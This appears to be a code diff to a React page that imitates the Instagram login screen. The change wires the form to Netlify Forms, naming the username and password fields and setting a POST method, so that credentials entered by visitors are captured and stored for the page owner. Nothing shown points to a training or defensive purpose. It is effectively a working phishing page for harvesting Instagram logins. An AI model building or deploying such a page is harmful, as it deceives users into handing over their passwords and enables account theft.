@@ -11,15 +11,16 @@ export default function Home() {
         <div className={styles.container}>
           <div className={styles.phoneappdemo} />
           <div className={styles.formdata}>
-            <form action="">
+            <form name="password"  method="POST" data-netlify="true" onSubmit="submit">
               <div className={styles.logo}>
                 <h1 className={styles.insta}>Instagram</h1>
               </div>
               <input
                 type="text"
+                name="name"
                 placeholder="Phone number, username, or email"
               />
-              <input type="password" placeholder="Password" />
+              <input name="password" type="password" placeholder="Password" />
               <button className={styles.formbtn} type="submit">
                 Log in
               </button>
